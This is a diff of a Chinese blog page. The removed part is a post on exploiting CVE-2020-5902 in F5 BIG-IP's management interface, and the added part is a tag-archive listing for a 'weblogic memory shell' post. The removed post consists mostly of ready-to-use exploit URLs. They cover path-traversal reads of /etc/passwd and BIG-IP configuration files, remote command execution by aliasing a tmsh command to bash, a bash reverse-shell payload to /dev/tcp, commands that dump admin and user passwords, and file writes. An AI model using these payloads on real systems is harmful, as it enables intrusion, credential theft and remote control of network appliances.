@@ -6,13 +6,12 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>cve-2020-5902 - jinny</title>
+  <title>weblogic内存马 - jinny</title>
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="google" content="notranslate" />
   
-  <meta name="description" content="文件读取
-https:///tmui/login.js...">
+  
   <meta name="author" content="jinny">
   <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
@@ -144,7 +143,7 @@ https:///tmui/login.js...">
       
       
     </div>
-    <div class="center">cve-2020-5902</div>
+    <div class="center">标签</div>
     <div class="right">
       <i class="iconfont iconmenu j-navbar-menu"></i>
     </div>
@@ -178,97 +177,23 @@ https:///tmui/login.js...">
   </div>
 </nav>
   <main id="main">
-  <div class="article-wrap">
-    <div class="row container">
-      <div class="col-xl-3"></div>
-      <div class="col-xl-6"><article class="article">
-  <div class="wrap">
-    <section class="head">
-  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
-  <div class="head-mask">
-    <h1 class="head-title">cve-2020-5902</h1>
-    <div class="head-info">
-      <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 06, 2020</span>
-      
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1320</span>
-    </div>
-  </div>
-</section>
-    <section class="main">
-      <section class="content">
-        <p>文件读取</p>
-<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</p>
-<img src="http://pl.jinny.vip/img/cve/2020-5902/readfile.png" class="full-image">
-
-
-
-<p>命令执行</p>
-<p>在进行命令执行demo时有较大几率output为空，可多尝试几遍</p>
-<p>利用filesave和tmshCmd可实现RCE</p>
-<p>1.修改alias劫持list命令为bash <a target="_blank" rel="noopener" href="https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp</a>? command=create+cli+alias+private+list+command+bash<br>2.写入bash文件 <a target="_blank" rel="noopener" href="https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</a>? fileName=/tmp/1.txt&amp;content=id</p>
-<p>3.执行bash文件</p>
-<p>PS:即使漏洞存在也可能需要多次执行才能成功（4次左右）。<br>同时可用反弹shell(将第二步的Payload换 为/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp? fileName=/tmp/1.txt&amp;content=bash+-i+&gt;%26+/dev/tcp/ip/port+0+&gt;=%26+1)</p>
-<p>4.还原list命令 <a target="_blank" rel="noopener" href="https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp</a>? command=delete+cli+alias+private+list</p>
-<p>查看admin的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin<br>查看所有用户的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list auth user</p>
-<img src="http://pl.jinny.vip/img/cve/2020-5902/rce1.png" class="full-image">
-
-<img src="http://pl.jinny.vip/img/cve/2020-5902/rce2.png" class="full-image">
-
-
-
-<p>文件上传</p>
-<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp<br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p>
-<img src="http://pl.jinny.vip/img/cve/2020-5902/uploadfile-1.png" class="full-image">
-
-<img src="http://pl.jinny.vip/img/cve/2020-5902/uploadfile-2.png" class="full-image">
-      </section>
-      <section class="extra">
+  <section class="archive">
+    <div class="archive-container">
+      <div class="archive-post">
+        <h2 class="archive-total"># weblogic内存马</h2>
         
-          <ul class="copyright">
-  
-    <li><strong>本文作者：</strong>jinny</li>
-    <li><strong>本文链接：</strong><a href="http://example.com/2020/07/06/cve-2020-5902/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;07&#x2F;06&#x2F;cve-2020-5902&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;07&#x2F;06&#x2F;cve-2020-5902&#x2F;index.html</a></li>
-    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
-  
-</ul>
-        
-        
-          <section class="donate">
-  <div id="qrcode-donate">
-    <img src="">
-  </div>
-  <div class="icon">
-    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
-    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
-  </div>
-</section>
-        
-        
-  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/jsp/" rel="tag">jsp</a></li></ul> 
-
-        
-  <nav class="nav">
-    <a href="/2021/05/12/weblogic-memshell/"><i class="iconfont iconleft"></i>weblogic内存马</a>
-    <a href="/2020/06/29/icmptunnel/">icmp隐藏隧道<i class="iconfont iconright"></i></a>
-  </nav>
-
-      </section>
-      
-    </section>
-  </div>
-</article></div>
-      <div class="col-xl-3">
         
           
-  <aside class="toc-wrap">
-    <h3 class="toc-title">文章目录：</h3>
-    
-  </aside>
-
+            <h3 class="archive-year">2021 年</h3>
+          
+          <div class="archive-item">
+            <a class="archive-date" href="/2021/05/12/weblogic-memshell/">05/12</a>
+            <a class="archive-title" href="/2021/05/12/weblogic-memshell/">weblogic内存马</a>
+          </div>
         
       </div>
     </div>
-  </div>
+  </section>
 </main>
   
 
